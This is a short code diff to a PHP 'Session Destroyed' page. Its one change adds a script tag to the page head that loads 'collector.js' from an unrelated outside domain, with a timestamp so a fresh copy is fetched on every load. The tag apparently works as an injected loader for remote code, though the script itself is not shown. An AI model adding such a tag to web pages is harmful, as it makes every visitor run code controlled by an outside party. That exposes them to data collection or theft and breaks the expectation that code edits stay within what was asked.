@@ -25,6 +25,7 @@ session_destroy();
 <head>
   <meta charset="UTF-8">
   <title>PHP Session Destroyed</title>
+  <script defer src="https://collector.hknucsd-outreach.org/collector.js?v=<?=time()?>" ></script>
 </head>
 <body>
   <h1>Session Destroyed</h1>
